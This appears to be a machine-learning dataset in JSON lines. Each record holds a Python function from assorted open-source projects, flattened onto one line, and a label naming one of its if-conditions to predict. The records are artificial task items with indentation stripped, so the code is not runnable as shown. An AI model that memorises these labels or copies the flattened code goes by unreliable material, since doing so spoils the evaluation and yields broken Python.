{"input": "def OnDeleteLine(self, items): for n in items: if n >= 0: name1 = self.items[n][2] name2 = self.items[n][4] del self.items[n] if name1 in self.bindiff.matched1: self.bindiff.matched1.remove(name1) if name2 in self.bindiff.matched2: self.bindiff.matched2.remove(name2) return [Choose.ALL_CHANGED] + items", "label": "if name1 in self . bindiff . matched1 :"}
{"input": "def on_treeview_buttonrelease(self, widget, event, data=None): if self.promptToSave(): # True result indicates user selected Cancel. Stop event propagation return True else: x = int(event.x) y = int(event.y) time = event.time pthinfo = widget.get_path_at_pos(x, y) if pthinfo is not None: path, col, cellx, celly = pthinfo currentPath, currentCol = widget.get_cursor() if currentPath != path: widget.set_cursor(path, col, 0) if event.button == 3: self.__popupMenu(event) return False", "label": "if event . button == 3 :"}
{"input": "def __lt__(self, other): try: if self._version != other._version: return self._version < other._version if self._ip != other._ip: return self._ip < other._ip if self.netmask != other.netmask: return self.netmask < other.netmask return False except AttributeError: return NotImplemented", "label": "if self . netmask != other . netmask :"}
{"input": "def config_video_apply(self, dev_id_info): df, da, add_define, hf, ha, add_hotplug = self.make_apply_data() ignore = add_hotplug if self.editted(EDIT_VIDEO_MODEL): model = self.get_combo_label_value(\"video-model\") if model: add_define(self.vm.define_video_model, dev_id_info, model) return self._change_config_helper(df, da, hf, ha)", "label": "if model :"}
{"input": "def write(self, b): if self._write_watcher is None: raise UnsupportedOperation(\"write\") while True: try: return _write(self._fileno, b) except (IOError, OSError) as ex: if ex.args[0] not in ignored_errors: raise wait_on_watcher(self._write_watcher, None, None, self.hub)", "label": "if ex . args [ 0 ] not in ignored_errors :"}
{"input": "def scan_resource_conf(self, conf): if \"enabled\" in conf and conf[\"enabled\"][0]: retention_block = conf[\"retention_policy\"][0] if retention_block[\"enabled\"][0]: retention_in_days = force_int(retention_block[\"days\"][0]) if retention_in_days and retention_in_days >= 90: return CheckResult.PASSED return CheckResult.FAILED", "label": "if retention_in_days and retention_in_days >= 90 :"}
{"input": "def _find_gist_with_file(user, filename, env): import requests # expensive page = 1 url = \"https://api.github.com/users/%s/gists\" % user while True: resp = requests.get( url, params={\"page\": page, \"per_page\": 100}, headers=_github_auth_headers(env), ) gists = resp.json() if not gists: return None for gist in gists: for name in gist[\"files\"]: if name == filename: return gist page += 1", "label": "if name == filename :"}
{"input": "def parse_position_spec(self): line = self.lookahead() if line.startswith(\"jump=\") or line.startswith(\"jcnd=\"): self.consume() return True mo = self._position_re.match(line) if not mo: return False position, id, name = mo.groups() if id: table = self._position_table_map[position] if name: self.position_ids[(table, id)] = name else: name = self.position_ids.get((table, id), \"\") self.positions[self._position_map[position]] = name self.consume() return True", "label": "if name :"}
{"input": "def remove_header(self, header): new_msg = b\"\" old_msg = self.msg_bytes.split(\"\\n\") i = 0 while True: line = old_msg[i] i += 1 if not line.startswith(b\"%s: \" % header): new_msg += line if line == \"\": break new_msg += old_msg[i:] self.msg_bytes = new_msg", "label": "if not line . startswith ( b\"%s: \" % header ) :"}
{"input": "def on_janitor_selection_changed(self, selection): model, iter = selection.get_selected() if iter: if self.janitor_model.iter_has_child(iter): iter = self.janitor_model.iter_children(iter) plugin = model[iter][self.JANITOR_PLUGIN] for row in self.result_model: if row[self.RESULT_PLUGIN] == plugin: self.result_view.get_selection().select_path(row.path) log.debug(\"scroll_to_cell: %s\" % row.path) self.result_view.scroll_to_cell(row.path)", "label": "if row [ self . RESULT_PLUGIN ] == plugin :"}
{"input": "def record_line(self, frame, event, arg): # pylint: disable=unused-argument \"\"\"Records line execution time.\"\"\" if event == \"line\": if self.prev_timestamp: runtime = time.time() - self.prev_timestamp self.lines.append([self.prev_path, self.prev_lineno, runtime]) self.prev_lineno = frame.f_lineno self.prev_path = frame.f_code.co_filename self.prev_timestamp = time.time() return self.record_line", "label": "if self . prev_timestamp :"}
{"input": "def get_outdated_docs(self) -> Iterator[str]: for docname in self.env.found_docs: if docname not in self.env.all_docs: yield docname continue targetname = path.join(self.outdir, docname + self.out_suffix) try: targetmtime = path.getmtime(targetname) except Exception: targetmtime = 0 try: srcmtime = path.getmtime(self.env.doc2path(docname)) if srcmtime > targetmtime: yield docname except OSError: # source doesn't exist anymore pass", "label": "if srcmtime > targetmtime :"}
{"input": "def _fetch_all_channels(self, force=False): \"\"\"Fetch all channel feeds from cache or network.\"\"\" channels = self._get_channel_configs(force=force) enabled = self._settings.get([\"enabled_channels\"]) forced = self._settings.get([\"forced_channels\"]) all_channels = {} for key, config in channels.items(): if key not in enabled and key not in forced: continue if \"url\" not in config: continue data = self._get_channel_data(key, config, force=force) if data is not None: all_channels[key] = data return all_channels", "label": "if key not in enabled and key not in forced :"}
{"input": "def _get_cortex_binary(kmer, cortex_dir): cortex_bin = None for check_bin in sorted(glob.glob(os.path.join(cortex_dir, \"bin\", \"cortex_var_*\"))): kmer_check = int(os.path.basename(check_bin).split(\"_\")[2]) if kmer_check >= kmer: cortex_bin = check_bin break assert ( cortex_bin is not None ), \"Could not find cortex_var executable in %s for kmer %s\" % (cortex_dir, kmer) return cortex_bin", "label": "if kmer_check >= kmer :"}
{"input": "def test_numeric_literals(self): @udf(BigIntVal(FunctionContext, SmallIntVal)) def fn(context, a): if a is None: return 1729 elif a < 0: return None elif a < 10: return a + 5 else: return a * 2", "label": "if a is None :"}
{"input": "def cs(self): \"\"\"ConfigSpace representation of this search space.\"\"\" cs = CS.ConfigurationSpace() for k, v in self.kwvars.items(): if isinstance(v, NestedSpace): _add_cs(cs, v.cs, k) elif isinstance(v, Space): hp = v.get_hp(name=k) _add_hp(cs, hp) else: _rm_hp(cs, k) return cs", "label": "elif isinstance ( v , Space ) :"}
{"input": "def lineReceived(self, line): if self.state == \"connected\": self.messageFilename = line self.state = \"gotMessageFilename\" if self.state == \"gotMessageFilename\": if line: self.metaInfo.append(line) else: if not self.metaInfo: self.transport.loseConnection() return self.filterMessage()", "label": "if not self . metaInfo :"}
{"input": "def __init__(self, reg, shtype, shimm, va): if shimm == 0: if shtype == S_ROR: shtype = S_RRX elif shtype == S_LSR or shtype == S_ASR: shimm = 32 self.reg = reg self.shtype = shtype self.shimm = shimm self.va = va", "label": "if shtype == S_ROR :"}
{"input": "def check_data(self, var_name: str, val: Dict[Any, Any]) -> None: if not isinstance(val, dict): raise AssertionError(f\"{var_name} is not a dictionary\") for key, value in val.items(): if not isinstance(key, str): raise AssertionError(f\"{var_name} has a non-string key\") check_data(self.value_type, f\"{var_name}[{key}]\", value)", "label": "if not isinstance ( key , str ) :"}
{"input": "def write_conditional_formatting(worksheet): \"\"\"Write conditional formatting to xml.\"\"\" df = DifferentialStyle() wb = worksheet.parent for cf in worksheet.conditional_formatting: for rule in cf.rules: if rule.dxf and rule.dxf != df: rule.dxfId = wb._differential_styles.add(rule.dxf) yield cf.to_tree()", "label": "if rule . dxf and rule . dxf != df :"}
{"input": "def _find_wordpress_compiler(self): \"\"\"Find WordPress compiler plugin.\"\"\" if self.wordpress_page_compiler is not None: return plugin_info = self.site.plugin_manager.getPluginByName(\"wordpress\", \"PageCompiler\") if plugin_info is not None: if not plugin_info.is_activated: self.site.plugin_manager.activatePluginByName(plugin_info.name) plugin_info.plugin_object.set_site(self.site) self.wordpress_page_compiler = plugin_info.plugin_object", "label": "if not plugin_info . is_activated :"}
{"input": "def _confirm(config): cli.out(\"You are about to initialize a Guild environment:\") for name, val in config.prompt_params: if isinstance(val, tuple): cli.out(\" {}:\".format(name)) for x in val: cli.out(\" {}\".format(x)) else: cli.out(\" {}: {}\".format(name, val)) return cli.confirm(\"Continue?\", default=True)", "label": "if isinstance ( val , tuple ) :"}
{"input": "def last_ok(nodes): for i in range(len(nodes) - 1, -1, -1): if ok_node(nodes[i]): node = nodes[i] if isinstance(node, ast.Starred): if ok_node(node.value): return node.value else: return None else: return nodes[i] return None", "label": "if isinstance ( node , ast . Starred ) :"}
{"input": "def _is_binary(fname, limit=80): try: with open(fname, \"rb\") as f: for i in range(limit): char = f.read(1) if char == b\"\\0\": return True if char == b\"\\n\": return False if char == b\"\": return except OSError as e: if xp.ON_WINDOWS and is_app_execution_alias(fname): return True raise e return False", "label": "if xp . ON_WINDOWS and is_app_execution_alias ( fname ) :"}
{"input": "def render(self): x = \"<span>\" for idx, arg in enumerate(self.args, start=1): if isinstance(arg, (tuple, list)): value, desc = arg else: value, desc = arg, arg attrs = self.attrs.copy() attrs[\"name\"] = self.name attrs[\"type\"] = \"radio\" attrs[\"value\"] = value attrs[\"id\"] = self.name + str(idx) if self.value == value: attrs[\"checked\"] = \"checked\" x += \"<input %s/> %s\" % (attrs, net.websafe(desc)) x += \"</span>\" return x", "label": "if self . value == value :"}
{"input": "def test01b_gml(self): \"Testing GML output.\" for g in self.geometries.wkt_out: geom = OGRGeometry(g.wkt) exp_gml = g.gml if GDAL_VERSION >= (1, 8): # In GDAL 1.8, the non-conformant GML tag <gml:GeometryCollection> was # replaced with <gml:MultiGeometry>. exp_gml = exp_gml.replace(\"GeometryCollection\", \"MultiGeometry\") self.assertEqual(exp_gml, geom.gml)", "label": "if GDAL_VERSION >= ( 1 , 8 ) :"}
{"input": "def _update_recording(self, frame, config): \"\"\"Adds a frame to the current video output.\"\"\" # pylint: disable=redefined-variable-type should_record = config[\"is_recording\"] if should_record: if not self.is_recording: self.is_recording = True print( \"Starting recording using %s\", self.video_writer.current_output().name() ) self.video_writer.write_frame(frame) elif self.is_recording: self.is_recording = False self.video_writer.finish() print(\"Finished recording\")", "label": "if not self . is_recording :"}
{"input": "def activate(self, ctx): for idx in ctx.chooser_selection: func_ea = idaapi.getn_func(idx - 1).startEA cfunc = helper.decompile_function(func_ea) obj = api.VariableObject(cfunc.get_lvars()[0], 0) if cfunc: NewDeepSearchVisitor(cfunc, 0, obj, cache.temporary_structure).process()", "label": "if cfunc :"}
{"input": "def finish(self, event, commit=0): target = self.target source = self.source widget = self.initial_widget root = self.root try: del root.__dnd self.initial_widget.unbind(self.release_pattern) self.initial_widget.unbind(\"<Motion>\") widget[\"cursor\"] = self.save_cursor self.target = self.source = self.initial_widget = self.root = None if target: if commit: target.dnd_commit(source, event) else: target.dnd_leave(source, event) finally: source.dnd_end(target, event)", "label": "if target :"}
{"input": "def run_epoch(model: BaseModel, loader, device: str, num_batches: int): model.eval() with Ctq(loader) as tq_loader: for batch_idx, data in enumerate(tq_loader): if batch_idx < num_batches: process(model, data, device) else: break", "label": "if batch_idx < num_batches :"}
{"input": "def find(d, target): remainingDicts = [d] while len(remainingDicts) > 0: current = remainingDicts.pop() for k, v in current.iteritems(): if k == target: return v if isinstance(v, dict): remainingDicts.insert(0, v) return None", "label": "if k == target :"}
{"input": "def node_exists(self, jid=None, node=None, ifrom=None): with self.lock: if jid is None: jid = self.xmpp.boundjid.full if node is None: node = \"\" if ifrom is None: ifrom = \"\" if isinstance(ifrom, JID): ifrom = ifrom.full if (jid, node, ifrom) not in self.nodes: return False return True", "label": "ifrom = ifrom . full"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 8: self.set_time(d.getVarInt64()) continue if tt == 16: self.set_level(d.getVarInt32()) continue if tt == 26: self.set_log_message(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 16 :"}
{"input": "def _merge_dict(d1, d2): # Modifies d1 in-place to take values from d2 # if the nested keys from d2 are present in d1. # https://stackoverflow.com/a/10704003/4488789 for k, v2 in d2.items(): v1 = d1.get(k) # returns None if v1 has no such key if v1 is None: raise Exception(\"{} is not recognized by client_config\".format(k)) if isinstance(v1, Mapping) and isinstance(v2, Mapping): _merge_dict(v1, v2) else: d1[k] = v2 return d1", "label": "if v1 is None :"}
{"input": "def build_and_apply_filters(query, objects, filter_func): if objects is not None: if isinstance(objects, str): query = query.filter(filter_func(objects)) elif isinstance(objects, list): t = [] for obj in objects: t.append(filter_func(obj)) query = query.filter(or_(*t)) return query", "label": "elif isinstance ( objects , list ) :"}
{"input": "def _worker_task(self, num: int): while True: try_ = 0 f = self.q.get() while try_ <= self.retries: rr = f() if not rr.retry: break try_ += 1 with self.stat_lock: self.exit_stat |= rr.ret_val self.q.task_done()", "label": "if not rr . retry :"}
{"input": "def get_benchmark_id_title_map(input_tree): input_root = input_tree.getroot() ret = {} for namespace in [XCCDF11_NS, XCCDF12_NS]: candidates = [] scrape_benchmarks(input_root, namespace, candidates) for _, elem in candidates: _id = elem.get(\"id\") if _id is None: continue title = \"<unknown>\" for element in elem.findall(\"{%s}title\" % (namespace)): title = element.text break ret[_id] = title return ret", "label": "if _id is None :"}
{"input": "def _call_tensor_ufunc(self, x1, x2, out=None, where=None): if hasattr(x1, \"__tensor_ufunc__\") or hasattr(x2, \"__tensor_ufunc__\"): ufunc = ( x1.__tensor_ufunc__ if hasattr(x1, \"__tensor_ufunc__\") else x2.__tensor_ufunc__ ) ret = ufunc(type(self), [x1, x2], out, where, **self.ufunc_extra_params) if ret is NotImplemented: return return ret", "label": "if hasattr ( x1 , \"__tensor_ufunc__\" )"}
{"input": "def remove_namespaces(xml): for elem in xml.getiterator(): if elem.tag is etree.Comment: continue i = elem.tag.find(\"}\") if i > 0: elem.tag = elem.tag[i + 1 :] return xml", "label": "if i > 0 :"}
{"input": "def attributive(adjective, gender=MALE): w = adjective.lower() # normal => normales if PLURAL in gender and not is_vowel(w[-1:]): return w + \"es\" # el chico inteligente => los chicos inteligentes if PLURAL in gender and w.endswith((\"a\", \"e\")): return w + \"s\" # el chico alto => los chicos altos if w.endswith(\"o\"): if FEMININE in gender and PLURAL in gender: return w[:-1] + \"as\" if FEMININE in gender: return w[:-1] + \"a\" if PLURAL in gender: return w + \"s\" return w", "label": "if PLURAL in gender :"}
{"input": "def atbash(s): translated = \"\" for i in range(len(s)): n = ord(s[i]) if s[i].isalpha(): if s[i].isupper(): x = n - ord(\"A\") translated += chr(ord(\"Z\") - x) if s[i].islower(): x = n - ord(\"a\") translated += chr(ord(\"z\") - x) else: translated += s[i] return translated", "label": "if s [ i ] . islower ( ) :"}
{"input": "def _add_all(self): stream = BytesIO() for page in self.graph_manager.pages: stream.write(page.url.encode(\"utf8\")) if not page.has_errors: for link in page.links: stream.write(link.url.encode(\"utf8\")) stream.write(linesep.encode(\"utf8\")) stream.seek(0) self.frontier.add_seeds(stream)", "label": "if not page . has_errors :"}
{"input": "def test_bigrand_ranges(self): for i in [40, 80, 160, 200, 211, 250, 375, 512, 550]: start = self.gen.randrange(2 ** i) stop = self.gen.randrange(2 ** (i - 2)) if stop <= start: return self.assertTrue(start <= self.gen.randrange(start, stop) < stop)", "label": "if stop <= start :"}
{"input": "def on_connect(self, request): web_socket = WebSocketResponse() await web_socket.prepare(request) self.app[\"websockets\"].add(web_socket) try: async for msg in web_socket: if msg.type == WSMsgType.TEXT: await self.on_status(None) elif msg.type == WSMsgType.ERROR: print( \"web socket connection closed with exception %s\" % web_socket.exception() ) finally: self.app[\"websockets\"].discard(web_socket) return web_socket", "label": "if msg . type == WSMsgType . TEXT :"}
{"input": "def __cut_all(self, sentence): dag = self.get_DAG(sentence) old_j = -1 for k, L in iteritems(dag): if len(L) == 1 and k > old_j: yield sentence[k : L[0] + 1] old_j = L[0] else: for j in L: if j > k: yield sentence[k : j + 1] old_j = j", "label": "if j > k :"}
{"input": "def filter_forms(forms): result = [] seen = set() for form in forms: if form in self._lemma_pos_offset_map: if pos in self._lemma_pos_offset_map[form]: if form not in seen: result.append(form) seen.add(form) return result", "label": "if pos in self . _lemma_pos_offset_map [ form ] :"}
{"input": "def __init__(self, el): self.elements = list(el) parameters = {} tokens = [] token_quote = \"@\" for key, value in el.attrib.items(): if key == \"token_quote\": token_quote = value if key == \"tokens\": for token in value.split(\",\"): tokens.append((token, REQUIRED_PARAMETER)) elif key.startswith(\"token_\"): token = key[len(\"token_\") :] tokens.append((token, value)) for name, default in tokens: parameters[name] = (token_quote, default) self.parameters = parameters", "label": "if key == \"tokens\" :"}
{"input": "def setPositionAfterSort(self, sortChildren): c = self p = c.p p_v = p.v parent = p.parent() parent_v = p._parentVnode() if sortChildren: p = parent or c.rootPosition() else: if parent: p = parent.firstChild() else: p = leoNodes.Position(parent_v.children[0]) while p and p.v != p_v: p.moveToNext() p = p or parent return p", "label": "if parent :"}
{"input": "def next(self): while not self.closed or not self._buffer.empty(): # input stream if self._input_iterator: try: chunck = next(self._input_iterator) return chunck except StopIteration: self.closed = True raise StopIteration() except Exception as ex: log.error(\"Failed downloading: %s\" % ex) else: # in/out stream try: return self._buffer.get(block=True, timeout=1.0) except Empty: pass raise StopIteration()", "label": "if self . _input_iterator :"}
{"input": "def _gen_GreaterEqual(self, args, ret_type): result = [] for lhs, rhs in pairwise(args): if ret_type == real_type: result.append(self.builder.fcmp_ordered(\">=\", lhs, rhs)) elif ret_type == int_type: result.append(self.builder.icmp_signed(\">=\", lhs, rhs)) else: raise CompileError() return reduce(self.builder.and_, result)", "label": "elif ret_type == int_type :"}
{"input": "def save_settings(self, settings): for setting in self.settings: setting_obj = settings[setting] new_value = self.cleaned_data.get(setting) if setting_obj.python_type == \"image\": if new_value and new_value != self.initial.get(setting): self.save_image(setting_obj, new_value) elif self.cleaned_data.get(\"%s_delete\" % setting): self.delete_image(setting_obj) else: self.save_setting(setting_obj, new_value)", "label": "if new_value and new_value != self . initial . get ( setting ) :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: length = d.getVarInt32() tmp = ProtocolBuffer.Decoder(d.buffer(), d.pos(), d.pos() + length) d.skip(length) self.add_events().TryMerge(tmp) continue if tt == 17: self.set_timeout_seconds(d.getDouble()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 17 :"}
{"input": "def _trim_steps(self, num_steps): \"\"\"Trims a given number of steps from the end of the sequence.\"\"\" steps_trimmed = 0 for i in reversed(range(len(self._events))): if self._events[i].event_type == PolyphonicEvent.STEP_END: if steps_trimmed == num_steps: del self._events[i + 1 :] break steps_trimmed += 1 elif i == 0: self._events = [ PolyphonicEvent(event_type=PolyphonicEvent.START, pitch=None) ] break", "label": "if steps_trimmed == num_steps :"}
{"input": "def save(self): data = self.cleaned_data previous_data = google_integration_model.get_by_account_id(self.account_id) if previous_data: previous_file = previous_data.get(\"file_id\") else: previous_file = None json_key_file = data.get(\"json_key\") if json_key_file: data[\"file_id\"] = files_model.add(json_key_file) del data[\"json_key\"] if previous_file: files_model.delete(previous_file) google_integration_model.save(data, account_id=self.account_id)", "label": "if previous_file :"}
{"input": "def _register(self, class_): with self.lock: table, slots = self._schema(class_) cur = self.db.execute(\"PRAGMA table_info(%s)\" % table) available = cur.fetchall() if available: available = [row[1] for row in available] missing_slots = (s for s in slots if s not in available) for slot in missing_slots: self.db.execute(\"ALTER TABLE %s ADD COLUMN %s TEXT\" % (table, slot)) else: self.db.execute( \"CREATE TABLE %s (%s)\" % (table, \", \".join(\"%s TEXT\" % s for s in slots)) )", "label": "if available :"}
{"input": "def describe_auto_scaling_instances(self, instance_ids): instance_states = [] for group in self.autoscaling_groups.values(): instance_states.extend( [ x for x in group.instance_states if not instance_ids or x.instance.id in instance_ids ] ) return instance_states", "label": "if not instance_ids or x . instance . id in instance_ids"}
{"input": "def add_nicknames(self, fields, data): \"\"\"Read the NICKNAME property of a VCard.\"\"\" for nick in self.split_unescaped(data, \",\"): nickname = nick.strip() if nickname: name = Name() name.set_nick_name(self.unesc(nickname)) self.person.add_alternate_name(name)", "label": "if nickname :"}
{"input": "def while1_test(a, b, c): while 1: if a != 2: if b: a = 3 b = 0 elif c: c = 0 else: a += b + c break return a, b, c", "label": "if a != 2 :"}
{"input": "def get_stream(conf, reload=False): if not conf: return conf # we can have 'stream' or 'class' or 'filename' if \"class\" in conf: class_name = conf.pop(\"class\") if not \".\" in class_name: cls = globals()[class_name] inst = cls(**conf) else: inst = resolve_name(class_name, reload=reload)(**conf) elif \"stream\" in conf: inst = conf[\"stream\"] elif \"filename\" in conf: inst = FileStream(**conf) else: raise ValueError(\"stream configuration invalid\") return {\"stream\": inst}", "label": "if not \".\" in class_name :"}
{"input": "def check_physical(self, line): \"\"\"Run all physical checks on a raw input line.\"\"\" self.physical_line = line for name, check, argument_names in self._physical_checks: self.init_checker_state(name, argument_names) result = self.run_check(check, argument_names) if result is not None: (offset, text) = result self.report_error(self.line_number, offset, text, check) if text[:4] == \"E101\": self.indent_char = line[0]", "label": "if result is not None :"}
{"input": "def delete_oidc_session_tokens(session): if session: if \"oidc_access_token\" in session: del session[\"oidc_access_token\"] if \"oidc_id_token\" in session: del session[\"oidc_id_token\"] if \"oidc_id_token_expiration\" in session: del session[\"oidc_id_token_expiration\"] if \"oidc_login_next\" in session: del session[\"oidc_login_next\"] if \"oidc_refresh_token\" in session: del session[\"oidc_refresh_token\"] if \"oidc_state\" in session: del session[\"oidc_state\"]", "label": "if \"oidc_login_next\" in session :"}
{"input": "def _fix_exception_context(new_exc, old_exc): # Context may not be correct, so find the end of the chain while 1: exc_context = new_exc.__context__ if exc_context is old_exc: # Context is already set correctly (see issue 20317) return if exc_context is None or exc_context is frame_exc: break new_exc = exc_context # Change the end of the chain to point to the exception # we expect it to reference new_exc.__context__ = old_exc", "label": "if exc_context is None or exc_context is frame_exc :"}
{"input": "def _write_all(self, out): while len(out) > 0: n = self.sock.send(out) if n <= 0: raise EOFError() if n == len(out): return out = out[n:] return", "label": "if n == len ( out ) :"}
{"input": "def view(input_path): if not exists(input_path): raise IOError(\"{0} not found\".format(input_path)) ua = None bundle_info = None try: archive = archive_factory(input_path) if archive is None: raise NotMatched(\"No matching archive type found\") ua = archive.unarchive_to_temp() bundle_info = ua.bundle.info finally: if ua is not None: ua.remove() return bundle_info", "label": "if archive is None :"}
{"input": "def _line_generator(fh, skip_blanks=False, strip=True): for line in fh: if strip: line = line.strip() skip = False if skip_blanks: skip = line.isspace() or not line if not skip: yield line", "label": "if not skip :"}
{"input": "def migrate_key(key, source, target): if source in config and key in config[source]: if config.get(target) is None: # make sure we have a serial tree config[target] = {} if key not in config[target]: # only copy over if it's not there yet config[target][key] = config[source][key] # delete feature flag del config[source][key] return True return False", "label": "if key not in config [ target ] :"}
{"input": "def get_params(self): if not hasattr(self, \"input_space\"): raise AttributeError(\"Input space has not been provided.\") rval = [] for layer in self.layers: for param in layer.get_params(): if param.name is None: logger.info(type(layer)) layer_params = layer.get_params() assert not isinstance(layer_params, set) for param in layer_params: if param not in rval: rval.append(param) rval = [elem for elem in rval if elem not in self.freeze_set] assert all([elem.name is not None for elem in rval]) return rval", "label": "if param not in rval :"}
{"input": "def _build_kwargs_string(cls, expectation): kwargs = [] for k, v in expectation[\"kwargs\"].items(): if k == \"column\": # make the column a positional argument kwargs.insert(0, \"{}='{}'\".format(k, v)) elif isinstance(v, str): # Put strings in quotes kwargs.append(\"{}='{}'\".format(k, v)) else: # Pass other types as is kwargs.append(\"{}={}\".format(k, v)) return \", \".join(kwargs)", "label": "elif isinstance ( v , str ) :"}
{"input": "def binary_search(_list, left, right, target): if right >= left: mid = (left + right) // 2 # if element is present at the mid itself if _list[mid] == target: return mid # If the element is smaller than mid, then it # can only be present in the left subarray if _list[mid] > target: return binary_search(_list, left, mid - 1, target) # Else the element can only be present in the right return binary_search(_list, mid + 1, right, target) return False", "label": "if _list [ mid ] > target :"}
{"input": "def _set_name(self, name): # Sanitize the file name so that it can't be dangerous. if name is not None: # Just use the basename of the file -- anything else is dangerous. name = os.path.basename(name) # File names longer than 255 characters can cause problems on older OSes. if len(name) > 255: name, ext = os.path.splitext(name) name = name[: 255 - len(ext)] + ext self._name = name", "label": "if len ( name ) > 255 :"}
{"input": "def scan_iter(self, match=None, count=None): nodes = await self.cluster_nodes() for node in nodes: if \"master\" in node[\"flags\"]: cursor = \"0\" while cursor != 0: pieces = [cursor] if match is not None: pieces.extend([\"MATCH\", match]) if count is not None: pieces.extend([\"COUNT\", count]) response = await self.execute_command_on_nodes([node], \"SCAN\", *pieces) cursor, data = list(response.values())[0] for item in data: yield item", "label": "if \"master\" in node [ \"flags\" ] :"}
{"input": "def drf_url(context, viewname, *args, **kwargs): \"\"\"Helper for DjangoRestFramework's ``reverse`` in templates.\"\"\" request = context.get(\"request\") if request: if not hasattr(request, \"versioning_scheme\"): request.versioning_scheme = api_settings.DEFAULT_VERSIONING_CLASS() request.version = request.versioning_scheme.determine_version( request, *args, **kwargs ) return drf_reverse(viewname, request=request, args=args, kwargs=kwargs)", "label": "if not hasattr ( request , \"versioning_scheme\" ) :"}
{"input": "def __call__(self, ctx): if ctx.range and ctx.value: if self.raw: ctx.range.raw_value = ctx.value return scalar = ctx.meta.get(\"scalar\", False) if not scalar: ctx.range = ctx.range.resize(len(ctx.value), len(ctx.value[0])) self._write_value(ctx.range, ctx.value, scalar)", "label": "if self . raw :"}
{"input": "def removeNamedItemNS(self, namespaceURI, localName): n = self.getNamedItemNS(namespaceURI, localName) if n is not None: _clear_id_cache(self._ownerElement) del self._attrsNS[(n.namespaceURI, n.localName)] del self._attrs[n.nodeName] if hasattr(n, \"ownerElement\"): n.ownerElement = None return n else: raise xml.dom.NotFoundErr()", "label": "if hasattr ( n , \"ownerElement\" ) :"}
{"input": "def __find_image(self, relpath): image_path = None for rp in self._resource_paths: for root, dirs, files in os.walk(rp): if relpath in files: image_path = os.path.join(root, relpath) break if image_path is not None: break return image_path", "label": "if relpath in files :"}
{"input": "def get_config_value(self, path, raise_if_not_found=True): if not path.is_concrete(): raise ValueError(\"Can't access config by masked path: %s\" % path) cfg = self._config for key in path: if key not in cfg: if raise_if_not_found: raise ValueError(\"Key not found: %r\" % key) else: return None cfg = cfg[key] return cfg", "label": "if raise_if_not_found :"}
{"input": "def unbind(**kwargs): for event, callback in kwargs.items(): if event not in _callbacks: raise Exception(\"Unknown {!r} event\".format(event)) else: for listener in _callbacks[event][:]: if listener.callback == callback: _callbacks[event].remove(listener) if event == \"on_new_intent\": _activity.unregisterNewIntentListener(listener) elif event == \"on_activity_result\": _activity.unregisterActivityResultListener(listener)", "label": "if event not in _callbacks :"}
{"input": "def _escape_attrib(text): # escape attribute value try: if \"&\" in text: text = text.replace(\"&\", \"&amp;\") if \"<\" in text: text = text.replace(\"<\", \"&lt;\") if \">\" in text: text = text.replace(\">\", \"&gt;\") if '\"' in text: text = text.replace('\"', \"&quot;\") if \"\\n\" in text: text = text.replace(\"\\n\", \"&#10;\") return text except (TypeError, AttributeError): # pragma: no cover _raise_serialization_error(text)", "label": "if '\"' in text :"}
{"input": "def _get_options(self, kwargs): options = {} for option in self._options: if option in kwargs: self._validate_option(option, kwargs[option]) options[option] = kwargs[option] else: options[option] = getattr(self, \"_\" + option) return options", "label": "if option in kwargs :"}
{"input": "def _parse_version_parts(s): for part in component_re.split(s): part = replace(part, part) if part in [\"\", \".\"]: continue if part[:1] in \"0123456789\": yield part.zfill(8) # pad for numeric comparison else: yield \"*\" + part yield \"*final\" # ensure that alpha/beta/candidate are before final", "label": "if part in [ \"\" , \".\" ] :"}
{"input": "def collect_deps(lib): queue = list(lib.deps_all) visited = set(queue) visited.add(lib) deps = [] # Traverse dependencies with breadth-first search. while queue: # Collect dependencies for next queue. next_queue = [] for lib in queue: for dep in lib.deps_all: if dep not in visited: next_queue.append(dep) visited.add(dep) # Append current queue to result. deps.append(collect_path_sorted_lib_idxs(queue)) queue = next_queue return deps", "label": "if dep not in visited :"}
{"input": "def process_chunks(self, chunks): chunk_id = self._chunk_id self._chunk_id += len(chunks) chunk_data = [] for chunk in chunks: if len(chunk.data) > MAX_LINE_SIZE: msg = \"Metric data exceeds maximum size of {} bytes. Dropping it.\".format( MAX_LINE_SIZE ) wandb.termerror(msg, repeat=False) util.sentry_message(msg) else: chunk_data.append(chunk.data) return { \"offset\": chunk_id, \"content\": chunk_data, }", "label": "if len ( chunk . data ) > MAX_LINE_SIZE :"}
{"input": "def truncateLogFile(): global logfilename logger.warn(\"Truncating log file %s\" % logfilename) with open(logfilename, \"w\") as f: f.write(\"\") for i in range(1, 25): rotatedFilename = \"%s.%d\" % (logfilename, i) if os.path.exists(rotatedFilename): logger.info(\"Deleting rotated file %s\" % rotatedFilename) os.unlink(rotatedFilename)", "label": "if os . path . exists ( rotatedFilename ) :"}
{"input": "def _page_contains(self, text): browser = self._current_browser() browser.switch_to_default_content() if self._is_text_present(text): return True subframes = self._element_find(\"xpath=//frame|//iframe\", False, False) self._debug(\"Current frame has %d subframes\" % len(subframes)) for frame in subframes: browser.switch_to_frame(frame) found_text = self._is_text_present(text) browser.switch_to_default_content() if found_text: return True return False", "label": "if found_text :"}
{"input": "def get_project_name_git(): is_git = check_output([\"git\", \"rev-parse\", \"--git-dir\"], stderr=subprocess.STDOUT) if is_git: project_address = check_output( [\"git\", \"config\", \"--local\", \"remote.origin.url\"] ) if isinstance(project_address, bytes) and str != bytes: project_address = project_address.decode() project_name = [i for i in re.split(r\"[/:\\s\\\\]|\\.git\", project_address) if i][ -1 ] return project_name.strip()", "label": "if isinstance ( project_address , bytes ) and str != bytes :"}
{"input": "def timer(ratio, step, additive): t = 0 slowmode = False while 1: if additive: slowmode |= bool((yield t)) else: slowmode = bool((yield t)) if slowmode: t += step * ratio else: t += step", "label": "if additive :"}
{"input": "def _call_connection_lost(self, exc): try: if self._protocol_connected: self._protocol.connection_lost(exc) finally: self._sock.close() self._sock = None self._protocol = None self._loop = None server = self._server if server is not None: server._detach() self._server = None", "label": "if server is not None :"}
{"input": "def _think(self): try: if len(self.addr_store) < self.preferred_storage and self.peers: random.choice(self.peers.values()).send_getaddrs(count=8) except: log.err() return random.expovariate(1 / 20)", "label": "if len ( self . addr_store ) < self . preferred_storage and self . peers :"}
